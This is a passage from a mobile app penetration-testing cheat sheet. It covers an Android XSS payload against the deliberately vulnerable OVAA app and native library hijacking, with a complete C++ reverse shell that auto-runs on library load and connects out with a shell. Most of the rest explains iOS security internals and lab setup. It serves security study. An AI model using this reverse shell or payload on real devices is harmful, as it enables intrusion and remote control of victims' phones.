<div class="highlight"><pre><span></span><code>adb<span class="w"> </span>logcat<span class="w"> </span><span class="o">[</span>options<span class="o">]</span><span class="w"> </span><span class="o">[</span>filter<span class="o">]</span>
</code></pre></div>
<p>Target a specific app by filtering the Logcat output: </p>
<div class="highlight"><pre><span></span><code>adb<span class="w"> </span>logcat<span class="w"> </span><span class="p">|</span><span class="w"> </span>grep<span class="w"> </span><span class="s2">"</span><span class="k">$(</span>adb<span class="w"> </span>shell<span class="w"> </span>ps<span class="w"> </span><span class="p">|</span><span class="w"> </span>grep<span class="w"> </span>&lt;package-name&gt;<span class="w"> </span><span class="p">|</span><span class="w"> </span>awk<span class="w"> </span><span class="s1">'{print $2}'</span><span class="k">)</span><span class="s2">"</span>
</code></pre></div>
<h4 id="xss">XSS</h4>
<p>Exploit web view activity not validating schema:</p>
<div class="highlight"><pre><span></span><code>adb<span class="w"> </span>shell<span class="w"> </span>am<span class="w"> </span>start<span class="w"> </span>-n<span class="w"> </span>oversecured.ovaa/.activities.WebViewActivity<span class="w"> </span>--es<span class="w"> </span>url<span class="w"> </span><span class="s1">'javascript://somehost/%0aalert\(\"mzfr\"\)'</span>
</code></pre></div>
<h4 id="dynamic-code-injection-native-library-hijacking">Dynamic Code Injection - Native Library Hijacking</h4>
<p>When the application dynamically loads native libraries or dex code, it's possible to abuse other vulnerabilities such as path traversal in order to inject evil code and  achieve code execution:</p>
<div class="highlight"><pre><span></span><code><span class="kd">private</span><span class="w"> </span><span class="kd">final</span><span class="w"> </span><span class="kt">void</span><span class="w"> </span><span class="nf">loadProLibrary</span><span class="p">()</span><span class="w"> </span><span class="p">{</span>
<span class="w">        </span><span class="k">try</span><span class="w"> </span><span class="p">{</span>
<span class="w">            </span><span class="n">String</span><span class="w"> </span><span class="n">abi</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">Build</span><span class="p">.</span><span class="na">SUPPORTED_ABIS</span><span class="o">[</span><span class="mi">0</span><span class="o">]</span><span class="p">;</span>
<span class="w">            </span><span class="n">File</span><span class="w"> </span><span class="n">libraryFolder</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="k">new</span><span class="w"> </span><span class="n">File</span><span class="p">(</span><span class="n">getApplicationContext</span><span class="p">().</span><span class="na">getFilesDir</span><span class="p">(),</span><span class="w"> </span><span class="s">"somedir/"</span><span class="w"> </span><span class="o">+</span><span class="w"> </span><span class="n">abi</span><span class="p">);</span>
<span class="w">            </span><span class="n">File</span><span class="w"> </span><span class="n">libraryFile</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="k">new</span><span class="w"> </span><span class="n">File</span><span class="p">(</span><span class="n">libraryFolder</span><span class="p">,</span><span class="w"> </span><span class="s">"dynamically_loaded_lib.so"</span><span class="p">);</span>
<span class="w">            </span><span class="n">System</span><span class="p">.</span><span class="na">load</span><span class="p">(</span><span class="n">libraryFile</span><span class="p">.</span><span class="na">getAbsolutePath</span><span class="p">());</span>
<span class="w">        </span><span class="p">}</span><span class="w"> </span><span class="k">catch</span><span class="w"> </span><span class="p">(</span><span class="n">UnsatisfiedLinkError</span><span class="w"> </span><span class="n">e</span><span class="p">)</span><span class="w"> </span><span class="p">{</span>
<span class="w">        </span><span class="p">...</span>
<span class="w">        </span><span class="p">}</span>
<span class="w">    </span><span class="p">}</span>
<span class="p">...</span>
<span class="c1">// Use dynamic loaded code</span>
<span class="n">someDynamicFunction</span><span class="p">();</span>
</code></pre></div>
<p>Following a C++ reverse shell:</p>
<div class="highlight"><pre><span></span><code><span class="cp">#include</span><span class="w"> </span><span class="cpf">&lt;cstdio&gt;</span>
<span class="cp">#include</span><span class="w"> </span><span class="cpf">&lt;cstdlib&gt;</span>
<span class="cp">#include</span><span class="w"> </span><span class="cpf">&lt;unistd.h&gt;</span>

<span class="cp">#include</span><span class="w"> </span><span class="cpf">&lt;sys/socket.h&gt;</span>
<span class="cp">#include</span><span class="w"> </span><span class="cpf">&lt;arpa/inet.h&gt;</span>
<span class="cp">#include</span><span class="w"> </span><span class="cpf">&lt;netinet/in.h&gt;</span>
<span class="cp">#include</span><span class="w"> </span><span class="cpf">&lt;sys/types.h&gt;</span>

<span class="c1">// remote host to "send" shell</span>
<span class="cp">#define REMOTE_HOST "127.0.0.1"</span>
<span class="cp">#define REMOTE_PORT 9999</span>

<span class="c1">// use "__attribute__" to call "reverse_shell" when load library</span>
<span class="kt">void</span><span class="w"> </span><span class="nf">__attribute__</span><span class="w"> </span><span class="p">((</span><span class="n">constructor</span><span class="p">))</span><span class="w"> </span><span class="n">reverse_shell</span><span class="p">()</span><span class="w"> </span><span class="p">{</span>
<span class="w">    </span><span class="c1">// create child process with fork</span>
<span class="w">    </span><span class="k">if</span><span class="w"> </span><span class="p">(</span><span class="n">fork</span><span class="p">()</span><span class="w"> </span><span class="o">==</span><span class="w"> </span><span class="mi">0</span><span class="p">)</span><span class="w"> </span><span class="p">{</span>
<span class="w">        </span><span class="kt">int</span><span class="w"> </span><span class="n">rsSocket</span><span class="p">;</span>

<span class="w">        </span><span class="k">struct</span><span class="w"> </span><span class="nc">sockaddr_in</span><span class="w"> </span><span class="n">socketAddr</span><span class="p">{};</span>

<span class="w">        </span><span class="c1">// configure socket address</span>
<span class="w">        </span><span class="n">socketAddr</span><span class="p">.</span><span class="n">sin_family</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">AF_INET</span><span class="p">;</span>
<span class="w">        </span><span class="n">socketAddr</span><span class="p">.</span><span class="n">sin_addr</span><span class="p">.</span><span class="n">s_addr</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">inet_addr</span><span class="p">(</span><span class="n">REMOTE_HOST</span><span class="p">);</span>
<span class="w">        </span><span class="n">socketAddr</span><span class="p">.</span><span class="n">sin_port</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">htons</span><span class="p">(</span><span class="n">REMOTE_PORT</span><span class="p">);</span>

<span class="w">        </span><span class="c1">// create socket connection</span>
<span class="w">        </span><span class="n">rsSocket</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">socket</span><span class="p">(</span><span class="n">AF_INET</span><span class="p">,</span><span class="w"> </span><span class="n">SOCK_STREAM</span><span class="p">,</span><span class="w"> </span><span class="mi">0</span><span class="p">);</span>
<span class="w">        </span><span class="n">connect</span><span class="p">(</span><span class="n">rsSocket</span><span class="p">,</span><span class="w"> </span><span class="p">(</span><span class="k">struct</span><span class="w"> </span><span class="nc">sockaddr</span><span class="w"> </span><span class="o">*</span><span class="p">)</span><span class="w"> </span><span class="o">&amp;</span><span class="n">socketAddr</span><span class="p">,</span><span class="w"> </span><span class="k">sizeof</span><span class="p">(</span><span class="n">socketAddr</span><span class="p">));</span>

<span class="w">        </span><span class="c1">// redirect std to socket</span>
<span class="w">        </span><span class="n">dup2</span><span class="p">(</span><span class="n">rsSocket</span><span class="p">,</span><span class="w"> </span><span class="mi">0</span><span class="p">);</span><span class="w"> </span><span class="c1">// stdin</span>
<span class="w">        </span><span class="n">dup2</span><span class="p">(</span><span class="n">rsSocket</span><span class="p">,</span><span class="w"> </span><span class="mi">1</span><span class="p">);</span><span class="w"> </span><span class="c1">// stdout</span>
<span class="w">        </span><span class="n">dup2</span><span class="p">(</span><span class="n">rsSocket</span><span class="p">,</span><span class="w"> </span><span class="mi">2</span><span class="p">);</span><span class="w"> </span><span class="c1">// stderr</span>

<span class="w">        </span><span class="c1">// get shell</span>
<span class="w">        </span><span class="n">execve</span><span class="p">(</span><span class="s">"/system/bin/sh"</span><span class="p">,</span><span class="w"> </span><span class="k">nullptr</span><span class="p">,</span><span class="w"> </span><span class="k">nullptr</span><span class="p">);</span>
<span class="w">    </span><span class="p">}</span>
<span class="p">}</span>
</code></pre></div>
<h2 id="ios_2">iOS</h2>
<h3 id="concepts_1">Concepts</h3>
<p>Reference: https://help.apple.com/pdf/security/en_GB/apple-platform-security-guide-b.pdf</p>
<h6 id="architecture_1">Architecture</h6>
<p><img alt="ios-architecture-extended.png" src="https://ojack69.github.io/jacks-corner/images/mobile/cheatsheet/ios-architecture-extended.png"/></p>
<ul>
<li><strong>Core OS:</strong><ul>
<li><strong>Kernel</strong>: Unix-based. Manages the system's resources (memory and CPU) and handles communication between hardware and software.</li>
<li><strong>Device Drivers</strong>: Interfaces with the hardware components.</li>
<li><strong>Security Frameworks</strong>: handles encryption, certificates and secure storage.</li>
<li><strong>File System</strong>: Manages the file system structure.</li>
</ul>
</li>
<li><strong>Core Services</strong>:<ul>
<li><strong>Foundation Framework</strong>: Provides basic data types, collections and other utility classes.</li>
<li><strong>Core Data</strong>: Manages the model layer in the MVC architecture, handling object graphs and persistence.</li>
<li><strong>Core Location</strong>: Provides location-based services using GPS. WiFi and cellular data</li>
<li><strong>Networking</strong>: Offers APIs for network communication, including HTTP and Bluetooth.</li>
<li><strong>CloudKit</strong>: Provides cloud storage and data synchronization services.</li>
<li><strong>WebKit</strong>: Integrate web content into app's native content.</li>
</ul>
</li>
<li><strong>Media</strong>:<ul>
<li><strong>Core Graphics</strong>: Handles 2D rendering and animations.</li>
<li><strong>Core Animation</strong>: Provides smooth and efficient animations.</li>
<li><strong>AVFoundation</strong>: Manages audio and video playback.</li>
<li><strong>Core Image</strong>: Allows image processing and filters.</li>
<li><strong>Metal and OpenGL ES</strong>: Provide support for high-performance 3D graphics rendering</li>
</ul>
</li>
<li><strong>Cocoa (Application)</strong>:<ul>
<li><strong>UIKit</strong>: Provides the building blocks for constructing the user interface, such as buttons, labels, and table views.</li>
<li><strong>Event Handling</strong>: Manages touch, motion and remote control events.</li>
<li><strong>Push Notifications</strong>: Handles the reception and processing of remote notifications.</li>
<li><strong>Social Media Integration</strong>: Offers built-in services for integrating with social networks.</li>
</ul>
</li>
</ul>
<h6 id="operating-system">Operating System</h6>
<p><img alt="ios-os-architecture.png" src="https://ojack69.github.io/jacks-corner/images/mobile/cheatsheet/ios-os-architecture.png"/></p>
<p>The core operating system is Darwin OS and it's the foundation for all specific iDevices OS (MacOS, iOS, tvOS, watchOS, visionOS, etc.).</p>
<p>The <strong>XNU</strong> kernel ("X is Not Unix") it's a hybrid kernel combining <strong>BSD</strong> kernel and <strong>Mach</strong> microkernel features.</p>
<ul>
<li><strong>BSD</strong>: File Systems, Unix utilities and network capabilities</li>
<li><strong>Mach</strong>: IPC, Memory management, Device drivers and I/O kit</li>
</ul>
<p>On iOS drivers are located at: <code>/System/Library/Extensions</code></p>
<p><strong>Mach-O (Mach object)</strong>: file format for executables, object code, shared libraries, dynamically loaded code, and core dumps.</p>
<h6 id="security-components">Security Components</h6>
<p>Hardware Security Components:</p>
<ul>
<li><strong>Effaceable Storage</strong>: A dedicated area of NAND storage, used to store cryptographic keys, that can be addressed directly and wiped securely. While it doesn&rsquo;t provide protection if an attacker has physical possession of a device, keys held in Effaceable Storage can be used as part of a key hierarchy to facilitate fast wipe and forward security.</li>
<li><strong>Boot Progress Register (BPR)</strong>: A set of system-on-chip (SoC) hardware flags that software can use to track the boot modes the device has entered, such as Device Firmware Update (DFU) mode and Recovery mode. After a Boot Progress Register flag is set, it can&rsquo;t be  cleared. This allows later software to get a trusted indicator of the state of the system.</li>
<li><strong>Boot ROM</strong>: The very first code executed by a device&rsquo;s processor when it first boots. As an integral part of the processor, it can&rsquo;t be altered by either Apple or an attacker.<ul>
<li><strong>Chain of Trust</strong>: Each stage of the boot process is cryptographically signed and verified by the previous stage, ensuring that only authenticated and unaltered code is executed.</li>
</ul>
</li>
<li><strong>iBoot</strong>: The stage 2 boot loader for all Apple devices. Code that loads XNU as part of the secure boot chain. Depending on the system-on-chip (SoC) generation, iBoot may be loaded by the Low-Level Bootloader or directly by the Boot ROM.</li>
<li><strong>Low-Level Bootloader (LLB)</strong>: On a Mac with a two-stage boot architecture, the LLB contains the code that&rsquo;s invoked by the Boot ROM, and that in turn loads iBoot, as part of the secure boot chain.</li>
<li><strong>Data Vault</strong>: A mechanism &mdash; enforced by the kernel &mdash; to protect against unauthorised access to data regardless of whether the requesting app is itself sandboxed.</li>
<li><strong>Device Firmware Upgrade (DFU) mode</strong>: A mode in which a device&rsquo;s Boot ROM code waits to be recovered via USB. The screen is black when in DFU mode, but upon connecting to a computer with the Finder or iTunes, the following prompt is presented: &ldquo;The Finder (or iTunes) has detected an iPhone (or iPad) in Recovery mode. The user must restore this iPhone (or iPad) before it can be used with the Finder (or iTunes).&rdquo;</li>
<li><strong>Secure Enclave</strong>: The Secure Enclave is a component on Apple system on a chip (SoC) that&rsquo;s included on all recent devices that provides the foundation for the secure generation and storage of the keys necessary for encrypting data at rest, and it protects and evaluates the biometric data for Optic ID, Face ID and Touch ID.</li>
<li><strong>xART</strong>: An abbreviation for eXtended Anti-Replay Technology. A set of services that provide encrypted, authenticated persistent storage for the Secure Enclave with anti-replay capabilities based on the physical storage architecture. See Secure Storage Component.</li>
<li><strong>XNU</strong>: The kernel at the heart of the Apple operating systems. It&rsquo;s assumed to be trusted, and it enforces security measures such as code signing, sandboxing, entitlement checking and Address Space Layout Randomisation (ASLR).</li>
</ul>
<p>Software Security Components:
- <strong>App Sandbox</strong>: It's an isolated environment. Each app runs in its own sandboxed environment, limiting its interactions with other apps and the operating systems. An application must request permission to access resources like the camera, microphone, location data, or contacts (managed by iOS's privacy controls)
- <strong>Automatic Security Updates</strong>: Apple regularly releases security updates that are easily deployable to users, ensuring that devices remain protected against the latests threats. For critical vulnerability, Apple can enfore updates to ensure that all users are protected.
- <strong>Code Signing</strong>: All iOS apps must be signed with a valid Apple-issued certificate. This prevents unauthorized code from running on the device. The signature is also validate at runtime, protecting against code injection or modification.
- <strong>Privacy Features</strong>: Users are prompted to grant or deny permissions to applications that need to access sensitive information such as location, photos and contacts. Application must declare why they need access to certain data. 
- <strong>Secure Boot Chain</strong>: 
    - <strong>Boot Loader Verification</strong>: The boot loader, responsible for loading the kernel, is cryptographically verified by the Boot ROM.
    - <strong>Kernel Integrity</strong>: The iOS kernel is signed and verified before it is allowed to execute, preventing unauthorized modifications.
- <strong>Tracking Prevention</strong>: Application must ask for permission before tracking users accross apps and websites (App Tracking Transparency - ATT). iOS provides reports to users showing which apps have accessed sensitive information or attempted to track them.
- <strong>XProtect</strong>: On devices with macOS, an antivirus technology for the signature-based detection and removal of malware.</p>
<p>General Exploit Mitigations:</p>
<ul>
<li><strong>Address Space Layout Randomizaion - ASLR</strong>: Randomizes memory addresses used by the system and app process to prevent attacker from predicting target locations in memory, making it harder to execute certain types of attacks (e.g. buffer overflows).</li>
<li><strong>Data Execution Prevention (DEP)</strong>: Ensures that certain areas of memory are marked as non-executable, preventing malicious code from being executed from these locations.</li>
<li><strong>Pointer Authentication Codes (PAC)</strong>: PAC adds cryptographic signatures to pointers in memory, making it difficult for attackers to manipulate them without detection.</li>
<li><strong>Stack Canaries</strong>: small random values (canary) placed before the stack return pointer. If the canary is altered, the app can detect and prevent buffer overflow attacks.</li>
<li><strong>System Integrity Protection (SIP)</strong>: Limits the capabilities of the root user to protect system integrity, reducing the attack surface available to malware and attackers.</li>
</ul>
<h6 id="data-protection">Data Protection</h6>
<p><strong>Data Protection</strong> is a technology used to protect data stored in flash storage on the devices; it's implemented by constructing and managing a hierarchy of keys and builds on the hardware encryption technologies built into Apple devices. </p>
<p>Data Protection is controlled on a <strong>per-file basis</strong> by assigning each file to a <strong>class</strong>; every time a file on the data volume is created, <strong>Data Protection</strong> creates a new 256-bit key
(the <strong>file key</strong>) and gives it to the hardware AES Engine, which uses the key to encrypt
the file as it&rsquo;s being written to flash storage. </p>
<p>The accessibility of the file is determined according to whether the class keys have been unlocked:</p>
<ul>
<li>The <strong>file key</strong> is stored in the <strong>file metadata</strong>.</li>
<li><strong>File metadata</strong> is encrypted with the mean of the <strong>file system key</strong>. This key is kept in <strong>Effaceable Storage</strong> to facilitate fast wipe rather than confidentiality and it's protected by the hardware UID.</li>
<li>When a file is opened, its <strong>metadata</strong> is decrypted with the <strong>file system key</strong>, revealing the wrapped <strong>file key</strong> and a notation on which class protects it. </li>
<li>The per-file (or per-extent) key is unwrapped with the <strong>class key</strong> and then supplied to the hardware AES Engine, which decrypts the file as it&rsquo;s read from flash storage.</li>
<li>The <strong>class key</strong> is protected with the hardware UID and, for some classes, the user&rsquo;s passcode.</li>
</ul>
<p>When a new file is created on devices supporting Data Protection, it&rsquo;s assigned a <strong>class</strong> by the app that creates it. Each class uses different policies to determine when the data is accessible:</p>
<ul>
<li><strong>Complete Protection (NSFileProtectionComplete)</strong>: The <strong>class key</strong> is protected with a key derived from the user passcode or password and the device UID. Shortly after the user locks a device (10 seconds, if the Require Password setting is Immediately), the decrypted class key is discarded, rendering all data in this class inaccessible until the user enters the passcode again or unlocks (logs in to) the device using Optic ID, Face ID or Touch ID.</li>
<li><strong>Protected Unless Open (NSFileProtectionCompleteUnlessOpen)</strong>: It's used when some files needs to be written while the device is locked or the user is logged out (e.g. a file downloading in the background). The file is decrypted when the device is unlocked but it remains accessible even though the device is then locked. This behaviour is achieved by using asymmetric elliptic curve cryptography (ECDH over Curve25519). The <strong>file key</strong> is protected by a key derived using One-Pass Diffie-Hellman Key Agreement. As soon as the file is closed, the <strong>file key</strong> is wiped from memory. To open the file again, the shared secret is re-created using the Protected Unless Open class&rsquo;s private key and the file&rsquo;s ephemeral public key, which are used to unwrap the <strong>file key</strong> that is then used to decrypt the file.</li>
<li><strong>Protected Until First User Authentication (NSFileProtectionCompleteUntilFirstUserAuthentication)</strong>: This class behaves in the same way as Complete Protection, except that the decrypted class key isn&rsquo;t removed from memory when the device is locked or the user logged out. </li>
<li><strong>No Protection (NSFileProtectionNone)</strong>: This class key is protected only with the UID and is kept in Effaceable Storage. Since all the keys needed to decrypt files in this class are stored on the device. The only benefit with this encryption is the fast remote wipe. This isn&rsquo;t supported in macOS.</li>
</ul>
<p><strong>If a file isn&rsquo;t assigned a Data Protection class, it is still stored in&nbsp;encrypted form (as is all data on an iOS device).</strong></p>
<h6 id="inter-process-communication-ipc_1">Inter-Process Communication - IPC</h6>
<p><strong>Universal Links</strong>: Deep-linking mechanism that allows users to open specific content within an app from a standard web link.</p>
<p><strong>URL Schemes</strong>: Apps can open other apps or send data by specifying a custom URL scheme.</p>
<p><strong>UIPasteboard</strong>: enables sharing data within applications. There are two types of pasteboard:</p>
<ul>
<li><strong>Systemwide Pasteboard</strong>: Sharing data with any application.</li>
<li><strong>Custom Pasteboard</strong>: Sharing data with app having same team ID.</li>
</ul>
<p>An application can possibly prevent to copy sensitive data to the clipboard.</p>
<p><strong>App Groups and Shared Containers</strong>: Allow apps from the same developer to share files and data securely.</p>
<p><strong>XPC Services</strong>: Lightweight services that allow apps to communicate with separate processes. It's a low level inter-process communication mechanism.</p>
<h6 id="plist-and-entitlements">Plist and Entitlements</h6>
<p>The entitlement <code>com.apple.developer.associated-domains</code> allows an app to securely associate with specific domains.</p>
<ul>
<li><code>applinks:</code>&nbsp;&rarr; Universal Links</li>
<li><code>webcredentials:</code>&nbsp;&rarr; Shared Web Credentials</li>
<li><code>appclips:</code>&nbsp;&rarr; App Clip invocation</li>
</ul>
<p>URL schemes are registered in the Info.plist in the <code>CFBundleURLTypes</code> property. It's necessary to distinguish <code>CFBundleURLTypes</code> from <code>LSApplicationQueriesSchemes</code>.</p>
<ul>
<li><code>CFBundleURLTypes</code>: Declares&nbsp;<strong>which custom URL schemes your app can&nbsp;<em>handle</em></strong>. Other apps (or Safari) can open your app via&nbsp;<code>UIApplication openURL:</code>&nbsp;or universal links.</li>
<li><code>LSApplicationQueriesSchemes</code>: Declares&nbsp;<strong>which custom URL schemes your app is&nbsp;<em>allowed to query</em></strong>. Needed when you want to check if another app is installed before opening it.</li>
</ul>
<h6 id="keychain">Keychain</h6>
<p>It's an encrypted container or sandbox where every application can store sensitive pieces of information and only an authorised app can retrieve the its content.</p>
<ul>
<li>iOS generates its own password for the keychain. This password is stored encrypted on the device: it's encrypted with AES using a key generate by applying PBKDF2 on the user's passcode to which is added a salt (generally, the device's UID - this makes impossible for another device to decrypt the Keychain password).</li>
</ul>
<p>Keychains can use <strong>access control lists (ACLs)</strong> to set policies for accessibility and authentication requirements. Items can establish conditions that require user presence by specifying that they can&rsquo;t be accessed unless authenticated using Optic ID, Face ID or Touch ID, or by entering the device&rsquo;s passcode or password. </p>
<ul>
<li>Access to items can also be limited by specifying that Optic ID, Face ID or Touch ID enrolment hasn&rsquo;t changed since the item was added. This limitation helps prevent an attacker from adding their own fingerprint to access a keychain item. </li>
<li>ACLs are evaluated inside the Secure Enclave and are released to the kernel only if their specified constraints are met.</li>
</ul>
<p>Following the access control flags:</p>
<ul>
<li><strong>kSecAccessControlDevicePasscode</strong>: Item is accessible after the user enters the device passcode.</li>
<li><strong>kSecAccessControlBiometryAny</strong>: Item is accessible using any enrolled biometric (Touch ID or Face ID); adding or removing biometrics does not invalidate the item.</li>
<li><strong>kSecAccessControlBiometryCurrentSet</strong>: Item is accessible using the current biometric set (Touch ID or Face ID); adding or removing a biometric invalidates the item.</li>
<li><strong>kSecAccessControlUserPresence</strong>: Item is accessible after user presence is confirmed (biometric or passcode); falls back to passcode if biometric is unavailable.</li>
<li><strong>kSecAccessControlApplicationPassword</strong>: Item requires an application‑specific password provided by your app.</li>
<li><strong>kSecAccessControlPrivateKeyUsage</strong>: Item is accessible only when used for private key operations.</li>
<li><strong>kSecAccessControlWatch</strong>: Item is accessible when an authenticated Apple Watch is nearby (watchOS 6 or later).</li>
</ul>
<p>The accessibility of a Keychain item is determined by the <code>kSecAttrAccessible</code> key set when adding (<code>SecItemAdd</code>) or updating (<code>SecItemUpdate</code>) it. The following configurable accessibility values for <a href="https://developer.apple.com/documentation/security/item-attribute-keys-and-values###1679100">kSecAttrAccessible</a> are the Keychain Data Protection classes:</p>
<ul>
<li><code>kSecAttrAccessibleAlways</code>: The data in the Keychain item can always be accessed, regardless of whether the device is locked.</li>
<li><code>kSecAttrAccessibleAlwaysThisDeviceOnly</code>: The data in the Keychain item can always be accessed, regardless of whether the device is locked. The data won't be included in an iCloud or local backup.</li>
<li><code>kSecAttrAccessibleAfterFirstUnlock</code>: The data in the Keychain item can't be accessed after a restart until the device has been unlocked once by the user.</li>
<li><code>kSecAttrAccessibleAfterFirstUnlockThisDeviceOnly</code>: The data in the Keychain item can't be accessed after a restart until the device has been unlocked once by the user. Items with this attribute do not migrate to a new device. Thus, after restoring from a backup of a different device, these items will not be present.</li>
<li><code>kSecAttrAccessibleWhenUnlocked</code>: The data in the Keychain item can be accessed only while the device is unlocked by the user.</li>
<li><code>kSecAttrAccessibleWhenUnlockedThisDeviceOnly</code>: The data in the Keychain item can be accessed only while the device is unlocked by the user. The data won't be included in an iCloud or local backup.</li>
<li><code>kSecAttrAccessibleWhenPasscodeSetThisDeviceOnly</code>: The data in the Keychain can be accessed only when the device is unlocked. This protection class is only available if a passcode is set on the device. The data won't be included in an iCloud or local backup.</li>
</ul>
<h6 id="app-extensions">App Extensions</h6>
<p>App Extensions allow to create custom functionalities and content that can be integrated into existing system applications.</p>
<p>When developing an&nbsp;<strong>application extension</strong>, the extension's&nbsp;<strong>extension point</strong> must be declared&nbsp;in your app's&nbsp;<code>Info.plist</code>&nbsp;using the&nbsp;<code>NSExtension</code>&nbsp;dictionary. Within this dictionary, the&nbsp;<code>NSExtensionPointIdentifier</code>&nbsp;key specifies the type of extension you're implementing.</p>
<p>Common Extension Point Identifiers (for&nbsp;<code>NSExtensionPointIdentifier</code>):</p>
<ul>
<li><strong>com.apple.widget-extension</strong>: Home Screen or Notification Center widgets (using WidgetKit).</li>
<li><strong>com.apple.share-services</strong>: Share extensions (e.g., share content to your app from other apps).</li>
<li><strong>com.apple.ui-services</strong>: Action extensions (e.g., modify or view content from another app).</li>
<li><strong>com.apple.keyboard-service</strong>: Custom keyboard extensions.</li>
<li><strong>com.apple.intents-service</strong>: SiriKit Intent extensions (handle voice commands).</li>
<li><strong>com.apple.callkit.call-directory</strong>: Call Directory extensions (block or identify callers).</li>
<li><strong>com.apple.watchkit</strong>: WatchKit extensions for watchOS apps.</li>
<li><strong>com.apple.fileprovider-ui</strong>: UI for File Provider extensions (used in Files app integration).</li>
<li><strong>com.apple.document-manager</strong>: Document Picker extensions (import/export documents).</li>
<li><strong>com.apple.photo-editing</strong>: Photo editing extensions for the Photos app.</li>
<li><strong>com.apple.messages-app</strong>: iMessage app extensions.</li>
<li><strong>com.apple.sticker-pack</strong>: Static sticker packs for iMessage.    </li>
<li><strong>com.apple.keyboard.quicktype.preview</strong>: QuickType keyboard preview extensions.</li>
<li><strong>com.apple.intents-ui-service</strong>: Custom UI for SiriKit intents.</li>
</ul>
<h6 id="webviews_1">WebViews</h6>
<p>There are three types of web view:</p>
<ul>
<li><code>UIWebView</code>: It's deprecate starting from iOS 12. <strong>JavaScript cannot be disabled</strong>.</li>
<li><code>WKWebView</code>: <ul>
<li>JavaScript is enabled by default but can be disabled by mean of the <code>javaScriptEnabled</code> property.</li>
<li><code>javaScriptCanOpenWindowsAutomatically</code> property can be used to control whether JavaScript is allowed to open windows or not on the web view.</li>
<li><code>hasOnlySecureContent</code> property can be used to verify that resources are received using an encrypted connection.</li>
<li>This webview does not support alerts!</li>
</ul>
</li>
<li><code>SFSafariViewController</code>:<ul>
<li>JavaScript cannot be disabled.</li>
<li>Shares cookies and website data with Safari.</li>
<li>The user's activity and interaction are not visible to the app.</li>
</ul>
</li>
</ul>
<p>A&nbsp;<strong>JavaScript-to-native bridge</strong>&nbsp;lets JavaScript running inside a&nbsp;<code>WKWebView</code>&nbsp;call into native Swift/Objective-C code, and optionally lets native code call back into JS.<br/>
This is usually implemented with&nbsp;<code>WKScriptMessageHandler</code>&nbsp;(for JS &rarr; native) and&nbsp;<code>evaluateJavaScript(_:completionHandler:)</code>&nbsp;(for native &rarr; JS).<br/>
It&rsquo;s the mechanism behind hybrid frameworks (Cordova, React Native, etc.) to access iOS APIs (e.g. camera, storage).</p>
<h6 id="ipa">IPA</h6>
<p>IPA structure:</p>
<ul>
<li><strong>Info.plist</strong> &ndash; Contains app metadata like bundle identifier, version, permissions, and configurations.</li>
<li><strong>_CodeSignature/</strong> &ndash; Holds cryptographic signatures ensuring the app hasn&rsquo;t been tampered with.</li>
<li><strong>Asset.car</strong> &ndash; Compiled asset catalog containing images, icons, and UI resources.</li>
<li><strong>Frameworks/</strong> &ndash; Bundled dynamic frameworks or libraries used by the app.</li>
<li><strong>Core Data/</strong> &ndash; Used to save application's permanent data for offline usage, to cache temporary data, etc.</li>
<li><strong>PkgInfo</strong> &ndash; Legacy file indicating the app package type and creator code.</li>
<li>The application <strong>Mach-O</strong> binary.</li>
</ul>
<p><code>Info.plist</code> interesting keywords:</p>
<ul>
<li><code>UsageDescription</code>: App Permissions ("Purpose Strings")</li>
<li><code>CFBundleSupportedPlatforms</code>: Contains the list of supported platforms (e.g. iPhone, simulator, iPad, etc.)</li>
<li><code>UIRequiredDeviceCapabilities</code>: Contains the supported architectures (e.g. armv7, arm64, x86-x64, etc.)</li>
<li><code>CFBundleShortVersionString</code>: App bundle version</li>
<li><code>CFBundleURLTypes</code>: Custom URL schemes. <ul>
<li>It also contains an entry for <code>CFBundleURLName</code> which is a unique identifier for the applications.</li>
</ul>
</li>
<li><code>UTExportedTypeDeclarations</code>: Exported custom document types</li>
<li><code>UTImportedTypeDeclarations</code>: Imported custom document types</li>
<li><code>NSAppTransportSecurity</code>: App Transport Security (e.g. HTTP or HTTPS). <ul>
<li><code>NSAllowsArbitraryLoads</code>: when enabled, it disables the App Transport Security (ATS) restrictions for all domains not specified in the&nbsp;<code>NSExceptionDomains</code>&nbsp;dictionary. This allows unsecured HTTP connections.</li>
</ul>
</li>
<li><code>UIMainStoryboardFile</code>: Contains the main file of the application (the first file that is ran).</li>
</ul>
<h3 id="lab-setup_3">Lab Setup</h3>
<h4 id="ssh-through-usb">SSH through USB</h4>
<p>Using <code>iproxy</code> it's possible to SSH to the mobile device via USB (no need to be in the same network):</p>
<div class="highlight"><pre><span></span><code>iproxy<span class="w"> </span><span class="m">2222</span><span class="w"> </span><span class="m">22</span>
</code></pre></div>
<p>Install <code>iproxy</code> with <code>brew</code>:</p>
<div class="highlight"><pre><span></span><code>brew<span class="w"> </span>install<span class="w"> </span>libusbmux
</code></pre></div>
<h4 id="iphone-sshfs">iPhone SSHFS</h4>
<p>It's possible to locally mount the iPhone file system via ssh using <code>sshfs</code>:</p>
<ol>
<li>Install macFUSE and sshfs from <a href="https://macfuse.github.io">here</a></li>
<li>Enable support for third party kernel extensions following <a href="https://github.com/macfuse/macfuse/wiki/Getting-Started###enabling-support-for-third-party-kernel-extensions-apple-silicon-macs">this guide</a></li>
<li>Connect the device with the USB cable (recommended for better performance)</li>
<li>Run <code>iproxy 2222 22</code></li>
<li>Run <code>sshfs -p 2222 mobile@localhost:/ &lt;mount point&gt;</code></li>
<li>When tasks are finished, unmount the device with <code>umount &lt;mount point&gt;</code></li>
</ol>
<h4 id="install-ipaapp-on-non-jailbreaken-device">Install IPA/APP on non-Jailbreaken device</h4>
<p>Manually:</p>
<ol>
<li>Install <a href="https://sideloadly.io/###download">Sideloadly</a></li>
<li>If it's blocked as malware, allow running from Settings -&gt; Privacy and Security</li>
<li>Insert AppleID and the password</li>
<li>Drag and drop IPA</li>
<li>Click on start</li>
</ol>
<p>Using <code>ios-deploy</code>:</p>
<div class="highlight"><pre><span></span><code>ios-deploy<span class="w"> </span>-b<span class="w"> </span>&lt;.app<span class="w"> </span>path&gt;<span class="w"> </span>--debug<span class="w"> </span>-W
</code></pre></div>
<h4 id="install-ipaapp-on-simulator">Install IPA/APP on simulator</h4>
<p><strong>Method 1:</strong></p>
<ol>
